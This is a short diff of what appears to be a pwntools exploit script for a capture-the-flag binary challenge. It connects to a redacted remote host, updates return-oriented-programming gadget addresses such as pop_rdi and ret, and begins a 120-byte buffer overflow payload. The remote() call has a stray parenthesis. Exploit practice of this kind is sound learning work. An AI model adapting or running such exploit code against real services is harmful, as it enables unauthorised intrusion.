@@ -3,13 +3,13 @@ from pwn import *
 
 r = remote("x.x.x.x"), 9999)
 
-main = 0x4012f8+4
+main = 0x4012db+4
 bfnc = 0x4011d6+4
 gets = 0x4010d0
 jumps = 0x40408c
-pop_rdi = 0x4013d3
+pop_rdi = 0x4013b3
 
-ret = 0x4013d4
+ret = 0x4013b4
 f_234 = 0x3f9df3b6
 
 payload = b'a' * 120
